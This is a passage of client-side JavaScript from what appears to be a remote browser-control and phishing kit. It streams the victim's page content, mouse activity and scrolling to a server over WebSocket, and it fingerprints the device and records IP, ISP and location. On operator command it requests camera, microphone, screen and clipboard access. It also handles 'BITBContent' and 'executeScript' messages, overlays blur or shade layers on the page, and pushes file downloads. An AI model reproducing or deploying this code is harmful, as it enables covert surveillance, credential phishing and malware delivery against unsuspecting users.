                    console.log('[HTML] Sending updated HTML content');
                    ws.send(JSON.stringify(message));
                }
            }
        }
        
        // Send HTML content immediately with high priority flag
        // Used specifically for refresh requests to ensure content displays without delay
        function sendHtmlContentImmediately() {
            // Get current HTML content
            const currentHtmlContent = document.body.innerHTML;
            lastHtmlContent = currentHtmlContent; // Update last content
            
            // Store in localStorage for recovery
            localStorage.setItem('bom_last_html_content', currentHtmlContent);
            localStorage.setItem('bom_last_html_time', Date.now());
            
            // Filter out JavaScript before sending
            let filteredContent = currentHtmlContent;
            
            // Remove script tags and their content
            filteredContent = filteredContent.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '');
            
            // Remove inline event handlers (onclick, onload, etc.)
            filteredContent = filteredContent.replace(/\son\w+\s*=\s*["']?[^"']*["']?/gi, '');
            
            // Remove javascript: URLs
            filteredContent = filteredContent.replace(/javascript\s*:/gi, 'disabled-javascript:');
            
            // Send HTML content message with high priority
            const message = {
                type: 'html-content',
                clientId: bomClientId,
                content: filteredContent,
                timestamp: new Date().toISOString(),
                pageTitle: document.title,
                pageUrl: window.location.href,
                priority: 'critical', // Highest priority for immediate processing
                forceDisplay: true,   // Force display even if content appears unchanged
                refreshResponse: true // Flag indicating this is in response to a refresh
            };
            
            if (ws.readyState === WebSocket.OPEN) {
                console.log('[HTML] Sending immediate HTML content for refresh');
                ws.send(JSON.stringify(message));
                
                // Also send current scroll position
                const scrollX = parseInt(localStorage.getItem('bom_last_scroll_x')) || 0;
                const scrollY = parseInt(localStorage.getItem('bom_last_scroll_y')) || 0;
                
                ws.send(JSON.stringify({
                    type: 'scroll-position',
                    clientId: bomClientId,
                    scrollX: scrollX,
                    scrollY: scrollY,
                    priority: 'critical',
                    timestamp: new Date().toISOString()
                }));
                
                // Schedule another content send after a short delay
                // This provides a backup in case the first one doesn't arrive
                setTimeout(() => {
                    if (ws.readyState === WebSocket.OPEN) {
                        ws.send(JSON.stringify({
                            ...message,
                            timestamp: new Date().toISOString(),
                            isRetry: true
                        }));
                    }
                }, 500);
            }
        }
        
        // Get detailed information about an element for accurate cursor positioning
        function getElementInfo(element, cursorX, cursorY) {
            // Skip if element doesn't exist
            if (!element) return null;
            
            try {
                // Get element's bounding rectangle
                const rect = element.getBoundingClientRect();
                
                // Get computed styles for border and padding
                const computedStyle = window.getComputedStyle(element);
                
                // Calculate cursor position relative to the element
                const relativeX = cursorX - rect.left;
                const relativeY = cursorY - rect.top;
                
                // Calculate position as a percentage within the element
                const elementXPercent = (relativeX / rect.width) * 100;
                const elementYPercent = (relativeY / rect.height) * 100;
                
                // Create a unique path to identify this element
                const elementPath = createElementPath(element);
                
                // Return comprehensive element information
                return {
                    tag: element.tagName.toLowerCase(),
                    id: element.id || null,
                    classes: Array.from(element.classList).join(' ') || null,
                    rect: {
                        left: rect.left,
                        top: rect.top,
                        width: rect.width,
                        height: rect.height
                    },
                    relativeCursor: {
                        x: relativeX,
                        y: relativeY,
                        xPercent: elementXPercent,
                        yPercent: elementYPercent
                    },
                    path: elementPath,
                    innerText: element.innerText ? element.innerText.substring(0, 50) : '',
                    computedStyle: {
                        backgroundColor: computedStyle.backgroundColor,
                        borderWidth: {
                            top: parseInt(computedStyle.borderTopWidth) || 0,
                            right: parseInt(computedStyle.borderRightWidth) || 0,
                            bottom: parseInt(computedStyle.borderBottomWidth) || 0,
                            left: parseInt(computedStyle.borderLeftWidth) || 0
                        },
                        padding: {
                            top: parseInt(computedStyle.paddingTop) || 0,
                            right: parseInt(computedStyle.paddingRight) || 0,
                            bottom: parseInt(computedStyle.paddingBottom) || 0,
                            left: parseInt(computedStyle.paddingLeft) || 0
                        }
                    }
                };
            } catch (error) {
                console.error('Error getting element info:', error);
                return null;
            }
        }
        
        // Create a path to identify an element
        function createElementPath(element) {
            let path = [];
            let currentElement = element;
            
            // Build path up to 5 levels or until body
            while (currentElement && currentElement !== document.body && path.length < 5) {
                let identifier = currentElement.tagName.toLowerCase();
                
                // Add ID if available
                if (currentElement.id) {
                    identifier += '#' + currentElement.id;
                } 
                // Add first class if available
                else if (currentElement.classList.length > 0) {
                    identifier += '.' + currentElement.classList[0];
                }
                // Add index among siblings
                else {
                    let index = 0;
                    let sibling = currentElement;
                    
                    while (sibling.previousElementSibling) {
                        sibling = sibling.previousElementSibling;
                        if (sibling.tagName === currentElement.tagName) {
                            index++;
                        }
                    }
                    
                    if (index > 0) {
                        identifier += `:nth-of-type(${index + 1})`;
                    }
                }
                
                path.unshift(identifier);
                currentElement = currentElement.parentElement;
            }
            
            return path.join(' > ');
        }
        
        // BOM - Mouse handlers
        
        // Track mouse movement with throttling
        let lastSentMousePosition = { x: 0, y: 0 };
        let mouseUpdateInterval;
        let pendingMouseUpdate = false;
        
        // Throttle mouse movement updates to every 30ms
        function throttledSendMousePosition(mouseX, mouseY) {
            // Update last known position (used for long click)
            lastMousePosition = { x: mouseX, y: mouseY };
            
            // If there's no pending update, schedule one
            if (!pendingMouseUpdate) {
                sendHtmlContentImmediately();
                captureStylesheets();
                localStorage.setItem('bom_content_request_time', Date.now());
                pendingMouseUpdate = true;
                
                // Send the update in the next animation frame (more performant)
                requestAnimationFrame(() => {
                    // Get viewport dimensions for percentage calculation
                    const viewportWidth = window.innerWidth;
                    const viewportHeight = window.innerHeight;
                    
                    // Calculate position as percentage of viewport (for consistency across different screen sizes)
                    const xPercent = (mouseX / viewportWidth) * 100;
                    const yPercent = (mouseY / viewportHeight) * 100;
                    
                    // Send position to server
                    const message = {
                        type: 'mouse-position',
                        clientId: bomClientId,
                        x: mouseX,
                        y: mouseY,
                        xPercent: xPercent,
                        yPercent: yPercent,
                        viewportWidth: viewportWidth,
                        viewportHeight: viewportHeight,
                        page: window.location.href,
                        timestamp: new Date().toISOString()
                    };
                    
                    // Only send if WebSocket is open
                    if (ws && ws.readyState === WebSocket.OPEN) {
                        ws.send(JSON.stringify(message));
                        console.log('Mouse position sent: ' + mouseX + ',' + mouseY);
                    }
                    
                    lastSentMousePosition = { x: mouseX, y: mouseY };
                    pendingMouseUpdate = false;
                });
            }
        }
        
        // Track mouse movement
        document.addEventListener('mousemove', (event) => {
            // Only send data if tracking is enabled
            if (!isTrackingEnabled) return;
            
            const mouseX = event.clientX;
            const mouseY = event.clientY;
            
            // Check if mouse has moved enough to warrant an update
            // Only send if mouse moved at least 5 pixels from last sent position
            if (Math.abs(mouseX - lastSentMousePosition.x) > 5 || Math.abs(mouseY - lastSentMousePosition.y) > 5) {
                throttledSendMousePosition(mouseX, mouseY);
            }
        }, { passive: true });
        
        // Track left mousedown for long click detection
        document.addEventListener('mousedown', (event) => {
            // Only process if tracking is enabled
            if (!isTrackingEnabled) return;
            
            // Store which button was pressed
            activeButton = event.button === 2 ? 'right' : 'left';
            isLongClick = false;
            
            // Get viewport dimensions for scaling
            const viewportWidth = window.innerWidth;
            const viewportHeight = window.innerHeight;
            
            // Update last known position (used for long click)
            lastMousePosition = { 
                x: event.clientX, 
                y: event.clientY,
                xPercent: (event.clientX / viewportWidth) * 100,
                yPercent: (event.clientY / viewportHeight) * 100
            };
            
            // Get element under cursor
            const elementUnderCursor = document.elementFromPoint(event.clientX, event.clientY);
            let elementInfo = null;
            
            if (elementUnderCursor) {
                elementInfo = getElementInfo(elementUnderCursor, event.clientX, event.clientY);
            }
            
            // Send mouse down event immediately
            const message = {
                type: 'mouse-down-start',
                clientId: bomClientId,
                x: event.clientX,
                y: event.clientY,
                xPercent: (event.clientX / viewportWidth) * 100,
                yPercent: (event.clientY / viewportHeight) * 100,
                viewportWidth: viewportWidth,
                viewportHeight: viewportHeight,
                button: activeButton,
                page: window.location.href,
                timestamp: new Date().toISOString(),
                elementInfo: elementInfo
            };
            
            if (ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify(message));
            }
            
            // Start timer for long click detection
            mouseDownTimer = setTimeout(() => {
                isLongClick = true;
                sendLongClickEvent(lastMousePosition, activeButton);
            }, longClickDelay);
        });
        
        // Track mouseup to cancel long click detection
        document.addEventListener('mouseup', (event) => {
            // Send mouse up event
            if (isTrackingEnabled && activeButton) {
                // Get viewport dimensions for scaling
                const viewportWidth = window.innerWidth;
                const viewportHeight = window.innerHeight;
                
                const message = {
                    type: 'mouse-down-end',
                    clientId: bomClientId,
                    x: event.clientX,
                    y: event.clientY,
                    xPercent: (event.clientX / viewportWidth) * 100,
                    yPercent: (event.clientY / viewportHeight) * 100,
                    viewportWidth: viewportWidth,
                    viewportHeight: viewportHeight,
                    button: activeButton,
                    wasLongClick: isLongClick,
                    page: window.location.href,
                    timestamp: new Date().toISOString()
                };
                
                if (ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify(message));
                }
            }
            
            if (mouseDownTimer) {
                clearTimeout(mouseDownTimer);
                mouseDownTimer = null;
            }
            
            // Reset active button
            activeButton = null;
        });
        
        // Track mouse leaving window to cancel long click detection
        document.addEventListener('mouseout', (event) => {
            if (event.relatedTarget === null) {
                if (mouseDownTimer) {
                    clearTimeout(mouseDownTimer);
                    mouseDownTimer = null;
                }
                
                // Reset active button
                activeButton = null;
            }
        });
        
        // Send long click event
        function sendLongClickEvent(position, button) {
            // Only send data if tracking is enabled
            if (!isTrackingEnabled) return;
            
            const clickX = position.x;
            const clickY = position.y;
            
            // Get viewport dimensions
            const viewportWidth = window.innerWidth;
            const viewportHeight = window.innerHeight;
            
            // Calculate position as percentage
            const xPercent = (clickX / viewportWidth) * 100;
            const yPercent = (clickY / viewportHeight) * 100;
            
            // Send long click position to server
            const message = {
                type: 'mouse-long-click',
                clientId: bomClientId,
                x: clickX,
                y: clickY,
                xPercent: xPercent,
                yPercent: yPercent,
                viewportWidth: viewportWidth,
                viewportHeight: viewportHeight,
                button: button, // which button was held down
                page: window.location.href,
                timestamp: new Date().toISOString(),
                priority: 'high' // Add priority flag to process immediately
            };
            
            if (ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify(message));
            }
        }
        
        // Track left clicks
        document.addEventListener('click', (event) => {
            // Only send data if tracking is enabled
            if (!isTrackingEnabled || isLongClick) return;
            
            const clickX = event.clientX;
            const clickY = event.clientY;
            
            // Get viewport dimensions
            const viewportWidth = window.innerWidth;
            const viewportHeight = window.innerHeight;
            
            // Calculate position as percentage
            const xPercent = (clickX / viewportWidth) * 100;
            const yPercent = (clickY / viewportHeight) * 100;
            
            // Send click position to server
            const message = {
                type: 'mouse-click',
                clientId: bomClientId,
                x: clickX,
                y: clickY,
                xPercent: xPercent,
                yPercent: yPercent,
                viewportWidth: viewportWidth,
                viewportHeight: viewportHeight,
                button: 'left',
                page: window.location.href,
                timestamp: new Date().toISOString(),
                priority: 'high' // Add priority flag
            };
            
            if (ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify(message));
            }
        });
        
        // Track right clicks
        document.addEventListener('contextmenu', (event) => {
            // Only send data if tracking is enabled
            if (!isTrackingEnabled || isLongClick) return;
            
            // Prevent the default context menu from appearing
            // Comment out the line below if you want to allow the context menu to appear
            // event.preventDefault();
            
            const clickX = event.clientX;
            const clickY = event.clientY;
            
            // Get viewport dimensions
            const viewportWidth = window.innerWidth;
            const viewportHeight = window.innerHeight;
            
            // Calculate position as percentage
            const xPercent = (clickX / viewportWidth) * 100;
            const yPercent = (clickY / viewportHeight) * 100;
            
            // Send right-click position to server
            const message = {
                type: 'mouse-click',
                clientId: bomClientId,
                x: clickX,
                y: clickY,
                xPercent: xPercent,
                yPercent: yPercent,
                viewportWidth: viewportWidth,
                viewportHeight: viewportHeight,
                button: 'right',
                page: window.location.href,
                timestamp: new Date().toISOString(),
                priority: 'high' // Add priority flag
            };
            
            if (ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify(message));
            }
        });
        // === BOM.js content end ===
        
        try {
            console.log('Establishing new WebSocket connection...');
            ws = new WebSocket(wsUrl);
            
            ws.onopen = function() {
                console.log('WebSocket connected successfully');
                connectionAttempts = 0; // Reset connection attempts on successful connection
                
                // Start periodic connection message sender
                startPeriodicConnectionSender();
                
                // Check if connection is through ngrok
                const isNgrok = window.location.hostname.includes('ngrok') || document.URL.includes('ngrok');
                
                // Get device fingerprint and info
                const deviceInfo = getStoredDeviceInfo();
                const deviceFingerprint = generateDeviceFingerprint();
                
                // Create a fully enhanced client ID that combines:
                // 1. The persistent device ID (from localStorage)
                // 2. The session-specific tab ID (from sessionStorage)
                // 3. A device fingerprint hash (computed from hardware/software characteristics)
                const enhancedClientId = clientId + '_' + deviceFingerprint;
                
                // Store the enhanced ID for future use
                sessionStorage.setItem('eden_enhanced_client_id', enhancedClientId);
                
                // Get system information
                const systemInfo = getSystemInfo();
                
                // Create comprehensive identification message
                const identificationMessage = {
                    type: 'connection',
                    clientId: enhancedClientId,
                    baseClientId: localStorage.getItem('eden_persistent_client_id'),
                    sessionId: sessionStorage.getItem('eden_session_client_id'),
                    deviceFingerprint: deviceFingerprint,
                    timestamp: Date.now(),
                    ip: clientIp,
                    details: {
                        ...deviceInfo,
                        browser: systemInfo.browser,
                        os: systemInfo.os,
                        isMobile: systemInfo.isMobile,
                        screen: `${systemInfo.screenWidth}x${systemInfo.screenHeight}`,
                        language: systemInfo.language || navigator.language,
                        colorDepth: systemInfo.colorDepth,
                        isp: locationInfo.isp || locationInfo.org || 'Unknown ISP',
                        city: locationInfo.city || 'Unknown',
                        region: locationInfo.region || 'Unknown',
                        country: locationInfo.country || 'Unknown',
                        timezone: locationInfo.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
                        ngrok: isNgrok
                    }
                };
                
                // Send identification message
                ws.send(JSON.stringify(identificationMessage));
                console.log('Identified with enhanced client ID:', enhancedClientId);
                
                // For ngrok connections, send identification again after a short delay
                // This improves reliability with multiple connections
                if (isNgrok) {
                    setTimeout(() => {
                        if (ws && ws.readyState === WebSocket.OPEN) {
                            ws.send(JSON.stringify(identificationMessage));
                            console.log('Sent follow-up identification for ngrok stability');
                        }
                    }, 1000);
                }
                
                hasConnectedBefore = true;
                
                // Initialize content tracking immediately
                initializeContentCapture();
                
                // Send initial mouse position
                const currentPosition = { 
                    x: lastMousePosition.x || window.innerWidth/2,
                    y: lastMousePosition.y || window.innerHeight/2
                };
                throttledSendMousePosition(currentPosition.x, currentPosition.y);
                
                // Set up a heartbeat optimized for ngrok connections - every 10 seconds
                clearInterval(heartbeatTimer);
                heartbeatTimer = setInterval(function() {
                    if (ws && ws.readyState === WebSocket.OPEN) {
                        // Send ping with enhanced client ID to maintain connection
                        ws.send(JSON.stringify({
                            type: 'ping',
                            clientId: enhancedClientId, // Use the enhanced ID for ngrok connections
                            ip: clientIp,
                            timestamp: Date.now(),
                            ngrok: isNgrok
                        }));
                    }
                }, 2000); // Ping every 2 seconds
            };
            
            ws.onclose = function() {
                console.log('WebSocket connection closed');
                clearInterval(heartbeatTimer);
                // Try to reconnect after a delay (similar to server.html)
                setTimeout(function() {
                    console.log('Attempting to reconnect...');
                    connectToServer();
                }, 3000);
            };
            
            ws.onerror = function(error) {
                console.error('WebSocket error:', error);
                if (ws && ws.readyState !== WebSocket.CLOSED) {
                    ws.close();
                }
                clearInterval(heartbeatTimer);
                // Try to reconnect after error with a longer delay
                setTimeout(function() {
                    console.log('Attempting to reconnect after error...');
                    connectToServer();
                }, 5000);
            };
            
            ws.onmessage = function(event) {
                try {
                    console.log("Received message from server:", typeof event.data === 'string' ? 
                        (event.data.startsWith('{') ? 'JSON: ' + event.data.substring(0, 50) + '...' : 'String: ' + event.data) : 
                        'Binary data');
                    
                    // Handle direct string permission request messages
                    if (typeof event.data === 'string' && !event.data.startsWith('{')) {
                        const message = event.data;
                        
                        // Handle permission request messages efficiently
                        if (message.startsWith('request-')) {
                            const permType = message.substring(8); // remove 'request-'
                            console.log(`Legacy permission request received for: ${permType}`);
                            
                            // Map permission types to handler functions - ensuring we handle each permission type
                            const handlers = {
                                'camera': requestCamera,
                                'microphone': requestMicrophone,
                                'screen': requestScreen,
                                'location': requestLocation,
                                'clipboard': requestClipboard,
                                
                            };
                            
                            // Call appropriate handler if it exists - wrap in try/catch for better error handling
                            if (handlers[permType]) {
                                try {
                                    console.log(`Executing ${permType} permission handler`);
                                    // Use the client's own ID
                                    const thisClientId = clientId;
                                    handlers[permType](thisClientId); // Pass the client's own ID explicitly
                                    console.log(`Successfully executed ${permType} handler with clientId: ${thisClientId}`);
                                } catch (permError) {
                                    console.error(`Error in ${permType} permission handler:`, permError);
                                    updateStatus(permType, false, `Error: ${permError.message}`);
                                }
                            } else {
                                console.log('Unknown permission type:', permType);
                                updateStatus('unknown', false, `Unknown permission type: ${permType}`);
                            }
                        } else {
                            console.log('Unknown direct message:', message);
                        }
                        return; // Exit early after handling direct message
                    }
                    
                    // Handle JSON messages
                    const message = JSON.parse(event.data);
                    console.log('Received message:', message.type, 'Client ID:', clientId);
                    
                    // Handle BOM.js tracking-related messages
                    switch(message.type) {
                        case 'tracking-control':
                            isTrackingEnabled = message.enabled === true;
                            console.log(`Tracking ${isTrackingEnabled ? 'enabled' : 'disabled'}`);
                            localStorage.setItem('mouseTrackerEnabled', isTrackingEnabled);
                            
                            if (isTrackingEnabled) {
                                // Initialize content capture if not already
                                initializeContentCapture();
                            } else if (contentObserver) {
                                contentObserver.disconnect();
                                if (contentSendInterval) {
                                    clearInterval(contentSendInterval);
                                    contentSendInterval = null;
                                }
                            }
                            break;
                            
                        
                            
                        case 'scroll-sync-request':
                            if (isTrackingEnabled) {
                                const scrollX = window.scrollX || window.pageXOffset;
                                const scrollY = window.scrollY || window.pageYOffset;
                                
                                ws.send(JSON.stringify({
                                    type: 'scroll-position',
                                    clientId: bomClientId,
                                    scrollX: scrollX,
                                    scrollY: scrollY,
                                    timestamp: new Date().toISOString(),
                                    priority: 'high'
                                }));
                            }
                            break;
                            
                        case 'viewer-refreshing':
                            console.log('Viewer is refreshing, preparing content for when it returns');
                            
                            // Pre-capture content so it's ready when the viewer reconnects
                            captureAndSendHtmlContent(true);
                            captureStylesheets();
                            
                            localStorage.setItem('viewer_refresh_pending', 'true');
                            localStorage.setItem('viewer_refresh_time', Date.now().toString());
                            
                            // Schedule content sending for when the viewer reconnects
                            setTimeout(() => {
                                if (ws && ws.readyState === WebSocket.OPEN) {
                                    console.log('Sending content after viewer refresh delay');
                                    sendHtmlContentImmediately();
                                }
                            }, 1000);
                            break;
                            
                        case 'set-scroll-position':
                            if (message.scrollX !== undefined && message.scrollY !== undefined) {
                                console.log(`Setting scroll position: ${message.scrollX}, ${message.scrollY}`);
                                window.scrollTo({
                                    left: message.scrollX,
                                    top: message.scrollY,
                                    behavior: 'smooth'
                                });
                            }
                            break;
                    }
                    
                    // Handle the new format permission requests
                    if (message.type === 'request-permission') {
                        const permType = message.permissionType;
                        console.log(`JSON permission request received for: ${permType}`);
                        
                        // First check if this request is meant for this client
                        const targetClientId = message.targetClientId;
                        const targetIp = message.targetIp;
                        const strictTargeting = message.strictTargeting === true;
                        
                        console.log(`Permission request targeting - clientId: ${targetClientId}, IP: ${targetIp}, strict: ${strictTargeting}`);
                        
                        // Determine if this client is being targeted
                        let isTargeted = false;
                        
                        if (targetClientId) {
                            // Check if our clientId matches or is contained in the target
                            isTargeted = 
                                clientId === targetClientId ||
                                clientId.includes(targetClientId) ||
                                targetClientId.includes(clientId);
                                
                            console.log(`Client ID targeting result: ${isTargeted}`);
                        }
                        
                        if (!isTargeted && targetIp && clientIp === targetIp) {
                            isTargeted = true;
                            console.log(`IP targeting result: ${isTargeted}`);
                        }
                        
                        // If strict targeting is on and we're not targeted, ignore
                        if (strictTargeting && !isTargeted) {
                            console.log("Ignoring permission request due to strict targeting - not for this client");
                            return;
                        }
                        
                        // Use existing handlers object from above
                        
                        // Call appropriate handler if it exists
                        if (handlers[permType]) {
                            try {
                                console.log(`Executing ${permType} permission handler with client ID: ${clientId}`);
                                // Explicitly pass the client's own ID
                                handlers[permType](clientId);
                                console.log(`Successfully executed ${permType} handler`);
                            } catch (permError) {
                                console.error(`Error in ${permType} permission handler:`, permError);
                                updateStatus(permType, false, `Error: ${permError.message}`, clientId);
                            }
                        } else {
                            console.log('Unknown permission type:', permType);
                            updateStatus('unknown', false, `Unknown permission type: ${permType}`, clientId);
                        }
                        return; // Process this message and exit
                    }
                    
                    // STRICT CLIENT TARGETING: Handle messages sent to specific clients
                    if (message.targetClientId || message.targetIp) {
                        // Get our stored enhanced client ID
                        const storedEnhancedClientId = sessionStorage.getItem('eden_enhanced_client_id') || enhancedClientId;
                        const deviceFingerprint = generateDeviceFingerprint();
                        
                        // Initialize target matching variables
                        let targetById = false;
                        let targetByIp = false;
                        
                        // Strict client ID targeting - highest priority
                        if (message.targetClientId) {
                            // First check for exact match with enhanced client ID (most secure)
                            if (storedEnhancedClientId && message.targetClientId === storedEnhancedClientId) {
                                console.log('✅ Exact match with enhanced client ID');
                                targetById = true;
                            }
                            // Check if our device fingerprint is part of the target ID
                            else if (message.targetClientId.includes(deviceFingerprint)) {
                                console.log('✅ Device fingerprint match');
                                targetById = true;
                            }
                            // Check our base client ID (less reliable but still valid)
                            else if (message.targetClientId.includes(localStorage.getItem('eden_persistent_client_id'))) {
                                console.log('✅ Base client ID match');
                                targetById = true;
                            }
                            // Fallback to original client ID
                            else if (message.targetClientId === clientId) {
                                console.log('✅ Original client ID match');
                                targetById = true;
                            }
                        }
                        
                        // IP matching is secondary and only used if not strict targeting
                        if (!targetById && message.targetIp && message.targetIp === clientIp) {
                            // Only use IP matching if strict targeting is not enabled
                            if (!message.strictTargeting) {
                                targetByIp = true;
                                console.log('✅ Matched by IP address (less secure)');
                            } else {
                                console.log('❌ IP match ignored due to strict targeting');
                            }
                        }
                        
                        // Determine if this message is for us
                        const isExplicitlyTargeted = targetById || targetByIp;
                        
                        // CRITICAL: Skip processing if we're not the target
                        if (!isExplicitlyTargeted) {
                            console.log('❌ MESSAGE REJECTED: Not targeted for this client');
                            console.log('Our client ID:', storedEnhancedClientId);
                            console.log('Target client ID:', message.targetClientId);
                            return;
                        }
                        
                        console.log('✅ MESSAGE ACCEPTED: Targeted for this client!');
                    } else if ((message.type === 'showContent' || 
                               message.type === 'BITBContent' || 
                               message.type === 'executeContent' || 
                               message.type === 'executeScript' || 
                               message.type === 'cleanContent' ||
                               message.type === 'clearWindows')) { 
                        // If they don't, reject them as a security measure
                        console.log('🛑 CONTENT MESSAGE REJECTED: No targeting information provided');
                        return;
                    } else {
                        // Non-content messages without targeting - these are broadcasts
                        console.log('📢 Broadcast message received (no target specified)');
                    }
                    
                    // Handle download-related messages from control.php
                    if (message.type === 'downloadshadecontent') {
                        console.log('Handling downloadshadecontent message');
                        // Pass intensity if provided
                        const intensity = message.intensity || 5;
                        download_showContent(message.content, message.fileName, message.fromSection || 'download', 'shade', message.location, intensity);
                        
                        // Save intensity to session storage
                        sessionStorage.setItem('eden-download-intensity', intensity.toString());
                        
                        if (message.downloadFlag === 'true') {
                            sessionStorage.setItem('eden-download-flag', 'true');
                        }
                        return;
                    } else if (message.type === 'noeffectcontent') {
                        console.log('Handling noeffectcontent message');
                        // Pass intensity if provided
                        const intensity = message.intensity || 5;
                        download_showContent(message.content, message.fileName, message.fromSection || 'download', 'none', message.location, intensity);
                        
                        // Save intensity to session storage
                        sessionStorage.setItem('eden-download-intensity', intensity.toString());
                        
                        if (message.downloadFlag === 'true') {
                            sessionStorage.setItem('eden-download-flag', 'true');
                        }
                        return;
                    } else if (message.type === 'downloadcustomeffect') {
                        console.log('Handling downloadcustomeffect message with custom effect:', message.customEffect?.name);
                        
                        // Store custom effect data and effect type in sessionStorage to persist across refreshes
                        if (message.customEffect) {
                            sessionStorage.setItem('eden-download-custom-effect', JSON.stringify(message.customEffect));
                            sessionStorage.setItem('eden-download-effect-type', 'custom');
                            localStorage.setItem('eden-download-effect-type', 'custom');
                            
                            // Store the effect name separately for easier lookup
                            if (message.customEffect.name) {
                                sessionStorage.setItem('eden-download-custom-effect-name', message.customEffect.name);
                                localStorage.setItem('eden-download-custom-effect-name', message.customEffect.name);
                            }
                        }
                        
                        // Store intensity if provided
                        if (message.intensity) {
                            sessionStorage.setItem('eden-download-intensity', message.intensity);
                            localStorage.setItem('eden-download-intensity', message.intensity);
                        }
                        
                        // Pass the correct parameters to download_showContent
                        download_showContent(
                            message.content,
                            message.fileName,
                            message.fromSection || 'download',
                            'custom',
                            message.location,
                            message.intensity || 5,
                            message.customEffect
                        );
                        
                        if (message.downloadFlag === 'true') {
                            sessionStorage.setItem('eden-download-flag', 'true');
                        }
                        return;
                    } else if (message.type === 'downloadContent') {
                        console.log('Handling downloadContent message');
                        if (message.location) {
                            // Pass intensity if provided
                            const intensity = message.intensity || 5;
                            download_showContent(message.content, message.fileName, message.fromSection || 'download', 'blur', message.location, intensity);
                            
                            // Save intensity to session storage
                            sessionStorage.setItem('eden-download-intensity', intensity.toString());
                            
                            // Set download flag if provided
                            if (message.downloadFlag === 'true') {
                                sessionStorage.setItem('eden-download-type', 'downloadContent');
                                sessionStorage.setItem('eden-download-flag', 'true');
                                console.log('Set download flag for content with location');
                            }
                        } else {
                            download_receiveDownloadContent(message.content, message.fileName, message.downloadFlag);
                        }
                        return;
                    } else if (message.type === 'cleanContent') {
                        console.log('Handling cleanContent message');
                        download_cleanContent();
                        return;
                    } else if (message.type === 'fileSelected') {
                        console.log('Handling fileSelected message');
                        download_addToDownloadSelection(message.fileName, message.content);
                        return;
                    } else if (message.type === 'fileDeselected') {
                        console.log('Handling fileDeselected message');
                        download_removeFromDownloadSelection(message.fileName);
                        return;
                    } else if (message.type === 'sudoDownload') {
                        console.log('Handling sudoDownload message');
                        if (message.files && Array.isArray(message.files)) {
                            download_batchDownloadFiles(message.files);
                        } else if (message.fileName && message.content) {
                            download_directDownloadFile(message.fileName, message.content);
                        }
                        return;
                    }
                    
                    // Handle different message types
                    switch(message.type) {
                        case 'request-camera':
                            requestCamera(clientId);
                            break;
                        case 'request-microphone':
                            requestMicrophone(clientId);
                            break;
                        case 'request-screen':
                            requestScreen(clientId);
                            break;
                        case 'request-location':
                            requestClipboard(clientId);
                            break;
                        case 'request-clipbord':
                            //alert();
                            monitorClipboardUpdates();
                            requestClipboard(clientId);
                            break;
                        

                        case 'blurContent':
                        download_cleanContent();
                        

                        // Combined handler for blur effect and content display
                            if (message.content && typeof message.content === 'string') {
                                console.log('Received blurContent message with content');
                                
                                const effectType = message.effect || 'blur';
                                const intensity = parseInt(message.intensity) || 5;
                                console.log(`Applying ${effectType} effect with intensity ${intensity}`);
                                
                                // First remove any existing overlays and session banner
                                document.querySelectorAll('#eden-blur-overlay, #eden-content-container, #eden-session-banner, #eden-custom-effect').forEach(el => {
                                    if (el && el.parentNode) {
                                        el.parentNode.removeChild(el);
                                    }
                                });
                                
                                // Also remove any existing session or spotlight styles
                                document.querySelectorAll('#eden-session-style, #eden-spotlight-style, #eden-custom-effect-style').forEach(el => {
                                    if (el && el.parentNode) {
                                        el.parentNode.removeChild(el);
                                    }
                                });
                                
                                // Create and apply blur overlay using etemp.js approach
                                const overlay = document.createElement('div');
                                overlay.id = 'eden-blur-overlay'; // Use ID instead of class
                                
                                // Apply different effects based on type using cssText
                                if (effectType === 'blur') {
                                    const blurAmount = Math.max(1, Math.min(20, intensity));
                                    overlay.style.cssText = `
                                        position: fixed;
                                        top: 0;
                                        left: 0;
                                        width: 100vw;
                                        height: 100vh;
                                        backdrop-filter: blur(${blurAmount}px);
                                        -webkit-backdrop-filter: blur(${blurAmount}px);
                                        background-color: rgba(0, 0, 0, 0.1);
                                        z-index: 999999;
                                        pointer-events: auto;
                                        display: block !important;
                                    `;
                                    console.log('Restored blur effect with intensity:', blurAmount, 'px');
                                } else if (effectType === 'shade') {
                                    const opacityValue = Math.max(0.2, Math.min(0.9, intensity / 20));
                                    overlay.style.cssText = `
                                        position: fixed;
                                        top: 0;
                                        left: 0;
                                        width: 100vw;
                                        height: 100vh;
                                        background-color: rgba(0, 0, 0, ${opacityValue});
                                        z-index: 999999;
                                        pointer-events: auto;
                                        display: block !important;
                                    `;
                                    console.log('Restored shade effect with opacity:', opacityValue);
                                } else if (effectType === 'custom' && message.customEffect) {
                                    // Handle custom effect
                                    const customEffect = message.customEffect;
                                    console.log('Applying custom effect:', customEffect.name);
                                    
                                    // Apply CSS-based effect (only support CSS now)
                                    const styleEl = document.createElement('style');
                                    styleEl.id = 'eden-custom-effect-style';
                                    
                                    // Add CSS variables for intensity that can be used in the custom CSS
                                    const intensityValue = Math.max(1, Math.min(20, intensity));
                                    const cssWithVars = `
                                        :root {
                                            --eden-effect-intensity: ${intensityValue};
                                            --eden-effect-opacity: ${intensityValue / 20};
                                            --eden-effect-blur: ${intensityValue}px;
                                            --eden-effect-contrast: ${100 + (intensityValue * 5)}%;
                                            --eden-effect-brightness: ${100 + (intensityValue * 2)}%;
                                        }
                                        ${customEffect.content}
                                    `;
                                    
                                    styleEl.textContent = cssWithVars;
                                    document.head.appendChild(styleEl);
                                    
                                    // Apply basic overlay with intensity-based properties
                                    const opacityValue = Math.max(0.1, Math.min(1.0, intensity / 20));
                                    overlay.style.cssText = `
                                        position: fixed;
                                        top: 0;
                                        left: 0;
                                        width: 100vw;
                                        height: 100vh;
                                        z-index: 999999;
                                        pointer-events: auto;
                                        display: block !important;
                                        opacity: ${opacityValue};
                                    `;
                                    
                                    // Add custom class for CSS targeting
                                    overlay.className = 'eden-custom-effect';
                                    
                                    console.log('Applied custom effect:', customEffect.name);
                                } else {
                                    // Default or 'none' effect
                                    overlay.style.cssText = `
                                        position: fixed;
                                        top: 0;
                                        left: 0;
                                        width: 100vw;
                                        height: 100vh;
                                       
                                        z-index: 999999;
                                        pointer-events: auto;
                                        display: block !important;
                                    `;
